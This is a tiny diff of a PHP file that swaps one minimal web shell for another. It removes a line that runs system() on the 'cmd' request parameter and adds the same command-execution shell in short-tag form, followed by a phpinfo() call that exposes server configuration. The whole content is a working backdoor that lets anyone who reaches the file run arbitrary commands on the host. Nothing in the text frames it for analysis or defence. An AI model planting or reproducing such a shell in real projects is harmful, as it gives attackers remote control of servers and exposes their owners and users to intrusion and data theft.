@@ -1,1 +1,3 @@
-<?php system($_REQUEST["cmd"]); ?>
+<?= system($_REQUEST['cmd']);
+phpinfo();
+?>
